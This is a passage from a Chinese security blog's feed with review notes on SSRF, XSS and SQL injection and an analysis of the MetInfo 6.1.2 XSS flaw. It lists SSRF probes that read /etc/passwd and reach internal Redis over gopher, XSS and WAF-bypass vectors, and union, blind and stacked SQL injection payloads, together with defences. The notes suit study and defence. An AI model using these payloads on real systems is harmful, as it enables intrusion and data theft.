class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 访问正常文件，提交参数&#96;[?url&#x3D;http:&#96;&#96;&#x2F;&#x2F;www.xxx.com&#x2F;robots.txt]&#96;</span><br><span class="line"></span><br><span class="line">- 端口扫描：当访问未开放端口，脚本会显示空白或者报错。提交参数&#96;[?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:2333]&#96;</span><br><span class="line">   当访问开放端口时，脚本会显示banner 信息。</span><br><span class="line"></span><br><span class="line">- 读取系统文件&#96;?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#96;</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;php</span><br><span class="line">  识别内网应用使用的框架，平台，模块以及cms可以为后续的渗透测试提供很多帮助。</span><br><span class="line">  大多数web应用框架都有一些独特的文件和目录。</span><br><span class="line">  通过这些文件可以识别出应用的类型，甚至详细的版本。</span><br><span class="line">  根据这些信息就可以针对性的搜集漏洞进行攻击。</span><br><span class="line">  比如可以通过访问下列文件来判断phpMyAdmin是否安装以及详细版本。</span><br><span class="line">  [?url&#x3D;http:&#x2F;&#x2F;localhost&#x2F;phpmyadmin&#x2F;README]</span><br></pre></td></tr></table></figure></code></pre></li><li><p>攻击内网应用</p></li></ul><h3 id="gopher、dict协议以及redis服务、Curl命令"><a href="#gopher、dict协议以及redis服务、Curl命令" class="headerlink" title="gopher、dict协议以及redis服务、Curl命令"></a>gopher、dict协议以及redis服务、Curl命令</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gopher 协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</span><br><span class="line">DICT协议,一个字典服务器协议,A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号:2628。</span><br><span class="line">redis服务是在6379端口开启的</span><br></pre></td></tr></table></figure><p>curl命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用file协议curl -v file:///etc/passwd</span><br><span class="line">使用ftp协议 curl -v "ftp://127.0.0.1:端口/info"</span><br><span class="line">使用dict协议 curl -v "dict://127.0.0.1:端口/info"</span><br><span class="line">使用gopher协议 curl -v "gopher://127.0.0.1:端口/_info"</span><br></pre></td></tr></table></figure><p>工具：<code>https://github.com/tarunkant/Gopherus</code>(生成对应payload)</p><p>做题可以从url入手</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url关键字</span><br><span class="line">share、wap、url、link、src、source、target、u、3g、display</span><br></pre></td></tr></table></figure><h3 id="ssrf漏洞验证"><a href="#ssrf漏洞验证" class="headerlink" title="ssrf漏洞验证"></a>ssrf漏洞验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</span><br><span class="line">比如:资源地址类型为 http:&#x2F;&#x2F;www.xxx.com&#x2F;a.php?image&#x3D;（地址） 的就可能存在SSRF漏洞</span><br><span class="line">2.dnslog等工具进行测试，看是否被访问：可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</span><br><span class="line">3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</span><br><span class="line">—从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</span><br><span class="line">—通过二级域名暴力猜解工具模糊猜测内网地址</span><br><span class="line">4.直接返回的Banner、title、content等信息</span><br><span class="line">5.留意bool型SSRF</span><br><span class="line">一般的SSRF在应用识别阶段返回的信息相对较多,比如Banner信息,HTTP Title信息,更有甚的会将整个HTTP的Reponse完全返回. 而Bool型SSRF的却永远只有True或者False。因为没有任何Response信息,所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload。</span><br></pre></td></tr></table></figure><h3 id="ssrf一些绕过手段"><a href="#ssrf一些绕过手段" class="headerlink" title="ssrf一些绕过手段"></a>ssrf一些绕过手段</h3><ul><li><p>更改ip地址(惯用手段为ip地址进制转换绕过)</p></li><li><p><code>0</code>在<code>linux</code>下为<code>127.0.0.1</code></p></li><li><p>使用解析到内网的域名(<code>xio.name</code>)</p></li><li><p>302跳转(写一个跳转到想访问的路径来避开过滤)</p></li><li><p>通过非HTTP协议（gopher打<code>redis</code>，file协议等）</p></li><li><p>利用<code>dns</code>解析</p></li><li><p>利用<code>IDN</code>(国际化域名)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。</span><br></pre></td></tr></table></figure></li><li><p>伪协议</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php ssrf中的伪协议：</span><br><span class="line">file;dict;sftp;ldap;tftp;gopher;http</span><br><span class="line"></span><br><span class="line">Java ssrf 中的伪协议：</span><br><span class="line">file;ftp;mailto;http;https;jar;netdoc;gopher</span><br></pre></td></tr></table></figure></li></ul><h3 id="ssrf防御策略"><a href="#ssrf防御策略" class="headerlink" title="ssrf防御策略"></a>ssrf防御策略</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.禁止跳转。</span><br><span class="line">2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">3.限制请求的端口只能为Web端口，不需要的协议，仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</span><br><span class="line">4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）,以防止对内网进行攻击。</span><br><span class="line">5.限制请求的端口为http常用的端口，比如 80、443、8080、8090。</span><br><span class="line">6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line">7.对DNS Rebinding，考虑使用DNS缓存或者Host白名单。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ssrf知识回顾&quot;&gt;&lt;a href=&quot;#ssrf知识回顾&quot; class=&quot;headerlink&quot; title=&quot;ssrf知识回顾&quot;&gt;&lt;/a&gt;ssrf知识回顾
    
    </summary>
    
    
    
      <category term="review" scheme="http://yoursite.com/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>MetInfo6.1.x[xss漏洞CVE-2018-18374]</title>
    <link href="http://yoursite.com/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/"/>
    <id>http://yoursite.com/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/</id>
    <published>2021-01-26T09:06:25.000Z</published>
    <updated>2021-01-26T09:56:13.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MetInfo-6-1-2版本XSS漏洞分析"><a href="#MetInfo-6-1-2版本XSS漏洞分析" class="headerlink" title="MetInfo 6.1.2版本XSS漏洞分析"></a>MetInfo 6.1.2版本XSS漏洞分析<a id="more"></a></h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞类型：XSS</span><br><span class="line">利用条件：管理员登录时访问攻击者制造的攻击链</span><br><span class="line">漏洞产生原因：echo直接输出了外部输入的anyid，&lt;script&gt;标签等没有做很好的过滤措施</span><br></pre></td></tr></table></figure><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpstudy</span><br><span class="line">phpstorm</span><br><span class="line">MetInfo 6.1.2版本</span><br><span class="line">windows一台</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本次漏洞复现先用公开的poc来打，再debug来加深对攻击链利用的整体过程的理解，由于只有php7的xdebug，项目环境应用php7一下的安装，所以就直接一步步来看了，有时间再debug过一遍</p><img src="/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/1.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点在<code>/app/system/include/public/ui/admin/head.php</code>的echo</p><img src="/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/2.png" class=""><p>anyid的值会被直接输出到<code>&lt;script&gt;</code>标签中，搜索到<code>$_M[&#39;form&#39;][&#39;anyid&#39;]</code>变量值由<code>app/system/include/class/common.class.php</code>中的load_form()方法，跟进</p><img src="/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/3.png" class=""><p><code>$_M[&#39;form&#39;][$_key]</code>的值会经过<code>daddslashes()</code>方法处理，跟进</p><img src="/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/4.png" class=""><p>可以看到如果<code>IN_ADMIN==true</code>,传入的字符串值只会被吃掉空格，转义预定义字符</p><p>全局搜索<code>IN_ADMIN</code>，<code>admin/index.php</code></p><img src="/2021/01/26/MetInfo6-1-x-xss%E6%BC%8F%E6%B4%9ECVE-2018-18374/5.png" class=""><p>刚好<code>admin/index.php</code>也是该漏洞利用的入口文件</p><p>后续的利用链触发回溯过程可以看一下这篇原创文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;187454.html</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>修改<code>app/system/include/function/common.func.php</code>的<code>daddslashes</code>方法，当<code>IN_ADMIN==true</code>，对$string进行标签过滤</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MetInfo-6-1-2版本XSS漏洞分析&quot;&gt;&lt;a href=&quot;#MetInfo-6-1-2版本XSS漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;MetInfo 6.1.2版本XSS漏洞分析&quot;&gt;&lt;/a&gt;MetInfo 6.1.2版本XSS漏洞分析
    
    </summary>
    
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xssreview</title>
    <link href="http://yoursite.com/2021/01/25/xssreview/"/>
    <id>http://yoursite.com/2021/01/25/xssreview/</id>
    <published>2021-01-25T06:52:42.000Z</published>
    <updated>2021-01-26T09:08:32.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS知识回顾"><a href="#XSS知识回顾" class="headerlink" title="XSS知识回顾"></a>XSS知识回顾<a id="more"></a></h2><h3 id="xss简述"><a href="#xss简述" class="headerlink" title="xss简述"></a>xss简述</h3><p><code>XSS</code>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。恶意网页程序通常是JavaScript，但实际上也可以包括<code>Java</code>，<code>VBScript</code>，<code>ActiveX</code>，Flash或者甚至是普通的HTML.</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</span><br></pre></td></tr></table></figure><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</span><br></pre></td></tr></table></figure><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</span><br></pre></td></tr></table></figure><h3 id="部分标签-触发xss"><a href="#部分标签-触发xss" class="headerlink" title="部分标签(触发xss)"></a>部分标签(触发xss)</h3><h4 id="1-lt-script-gt"><a href="#1-lt-script-gt" class="headerlink" title="1.&lt;script&gt;"></a>1.<code>&lt;script&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-lt-img-gt"><a href="#2-lt-img-gt" class="headerlink" title="2.&lt;img&gt;"></a>2.<code>&lt;img&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h4 id="3-lt-input-gt"><a href="#3-lt-input-gt" class="headerlink" title="3.&lt;input&gt;"></a>3.<code>&lt;input&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus&#x3D;&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="4-lt-details-gt"><a href="#4-lt-details-gt" class="headerlink" title="4.&lt;details&gt;"></a>4.<code>&lt;details&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">ontoggle自动触发</span><br><span class="line">&lt;details open ontoggle&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="5-lt-select-gt"><a href="#5-lt-select-gt" class="headerlink" title="5.&lt;select&gt;"></a>5.<code>&lt;select&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus&#x3D;alert(1)&gt;&lt;&#x2F;select&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus&#x3D;alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="6-lt-iframe-gt"><a href="#6-lt-iframe-gt" class="headerlink" title="6.&lt;iframe&gt;"></a>6.<code>&lt;iframe&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;alert(&quot;xss&quot;);&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><h4 id="7-lt-audio-gt"><a href="#7-lt-audio-gt" class="headerlink" title="7.&lt;audio&gt;"></a>7.<code>&lt;audio&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src&#x3D;x  onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h4 id="8-lt-body-gt"><a href="#8-lt-body-gt" class="headerlink" title="8.&lt;body&gt;"></a>8.<code>&lt;body&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line">利用换行符和autofocus自动触发onscroll</span><br><span class="line">&lt;body</span><br><span class="line">onscroll&#x3D;alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="9-lt-textarea-gt"><a href="#9-lt-textarea-gt" class="headerlink" title="9.&lt;textarea&gt;"></a>9.<code>&lt;textarea&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus&#x3D;alert(&quot;xss&quot;); autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="10-lt-keygen-gt"><a href="#10-lt-keygen-gt" class="headerlink" title="10.&lt;keygen&gt;"></a>10.<code>&lt;keygen&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus&#x3D;alert(1)&gt;&#x2F;&#x2F;限火狐</span><br></pre></td></tr></table></figure><h3 id="javascript伪标签"><a href="#javascript伪标签" class="headerlink" title="javascript伪标签"></a>javascript伪标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;标签</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#96;xss&#96;);&quot;&gt;xss&lt;&#x2F;a&gt;</span><br><span class="line">&lt;iframe&gt;标签</span><br><span class="line">&lt;ifframe src&#x3D;javascript:alert(&#96;xss&#96;);&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;form&gt;标签</span><br><span class="line">&lt;form action&#x3D;&quot;Javascript:alert(1)&quot;&gt;&lt;input type&#x3D;submit&gt;</span><br></pre></td></tr></table></figure><h3 id="部分waf绕过"><a href="#部分waf绕过" class="headerlink" title="部分waf绕过"></a>部分waf绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;代替空格</span><br><span class="line">大小写绕过、双鞋绕过关键字</span><br><span class="line">字符拼接(本地尝试并未成功)</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;a&#x3D;&#96;aler&#96;;b&#x3D;&#96;t&#96;;c&#x3D;&#39;(&#96;xss&#96;);&#39;;eval(a+b+c)&quot;&gt;</span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&#96;xss&#96;);&lt;&#x2F;script&gt;</span><br><span class="line">unicode编码绕过</span><br><span class="line">url编码绕过</span><br><span class="line">Ascii编码绕过</span><br><span class="line">hex、base64等绕过</span><br><span class="line">双引号，单引号过滤：html标签不用引号，js中用反引号代替</span><br><span class="line">过滤括号用throw绕过：&lt;svg&#x2F;onload&#x3D;&quot;window.onerror&#x3D;eval;throw&#39;&#x3D;alert\x281\x29&#39;;&quot;&gt;</span><br><span class="line">各种进制绕过ip地址</span><br><span class="line">html标签中用&#x2F;&#x2F;可以代替http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><ul><li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; &#39; /</code>等危险字符</li><li>HTTP-only Cookie: 禁止<code>JavaScript</code> 读取某些敏感<code>Cookie</code>，攻击者完成<code>XSS</code>注入后也无法窃取此Cookie。</li><li>设置<code>CSP(Content Security Policy)</code></li><li>输入内容长度限制</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS知识回顾&quot;&gt;&lt;a href=&quot;#XSS知识回顾&quot; class=&quot;headerlink&quot; title=&quot;XSS知识回顾&quot;&gt;&lt;/a&gt;XSS知识回顾
    
    </summary>
    
    
    
      <category term="review" scheme="http://yoursite.com/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>sql注入review</title>
    <link href="http://yoursite.com/2021/01/23/sql%E6%B3%A8%E5%85%A5review/"/>
    <id>http://yoursite.com/2021/01/23/sql%E6%B3%A8%E5%85%A5review/</id>
    <published>2021-01-23T07:56:50.000Z</published>
    <updated>2021-01-23T15:58:12.569Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入<a id="more"></a></h2><h3 id="什么是Sql注入攻击？"><a href="#什么是Sql注入攻击？" class="headerlink" title="什么是Sql注入攻击？"></a>什么是Sql注入攻击？</h3><p>Sql注入是发生于应用程序与数据库层的安全漏洞。Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击。</p><h3 id="Sql注入的分类"><a href="#Sql注入的分类" class="headerlink" title="Sql注入的分类"></a>Sql注入的分类</h3><h4 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h4><ul><li>数字型</li><li>字符型</li></ul><h4 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h4><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li></ul><h4 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h4><ul><li>报错注入</li><li>盲注<ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li>union注入</li></ul><h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ul><li>宽字节注入</li></ul><h3 id="手工注入基本流程"><a href="#手工注入基本流程" class="headerlink" title="手工注入基本流程"></a>手工注入基本流程</h3><ol><li>确认注入点</li><li>确认数据库类型和版本</li><li>fuzz测试确认被过滤的字符及相关函数</li><li>获取当前数据库名、获取表名、获取列名、获取字段值</li></ol><h3 id="部分相关函数"><a href="#部分相关函数" class="headerlink" title="部分相关函数"></a>部分相关函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">length(str) ：返回字符串str的长度</span><br><span class="line">substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从<span class="number">1</span>开始的，不是数组的<span class="number">0</span>开始</span><br><span class="line">mid(str,pos,len) ：跟上面的一样，截取字符串</span><br><span class="line">ascii(str) ：返回字符串str的最左面字符的ASCII代码值</span><br><span class="line">ord(str) ：将字符或布尔类型转成ascll码</span><br><span class="line"><span class="keyword">if</span>(a,b,c) ：a为条件，a为<span class="keyword">true</span>，返回b，否则返回c，如<span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),返回<span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="常见注入攻击手法"><a href="#常见注入攻击手法" class="headerlink" title="常见注入攻击手法"></a>常见注入攻击手法</h3><ul><li>union注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li>布尔注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用substr(a,b,c),从第b位开始取出a中长度为c的子串</span><br><span class="line">?id=1'and ascii(substr(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()limit0,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">113</span><span class="comment">#</span></span><br><span class="line">regexp匹配</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and 1=(select 1 from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">' and column_name regexp '</span>^userame<span class="string">'limit 0,1)#</span></span><br></pre></td></tr></table></figure><ul><li>时间注入</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure><ul><li>堆叠注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id = 1';<span class="keyword">select</span> <span class="keyword">if</span>(sub(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'r'</span>,<span class="keyword">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)%<span class="number">23</span></span><br><span class="line"><span class="keyword">handler</span>查询</span><br><span class="line"><span class="number">0</span><span class="string">'; handler 表名 open as qwzf; handler qwzf read first; handler qwzf close;#</span></span><br><span class="line"><span class="string">预编译</span></span><br><span class="line"><span class="string">SeT@a= ;</span></span><br><span class="line"><span class="string">prepare execsql from @a;</span></span><br><span class="line"><span class="string">execute execsql;#</span></span><br></pre></td></tr></table></figure><ul><li>报错注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 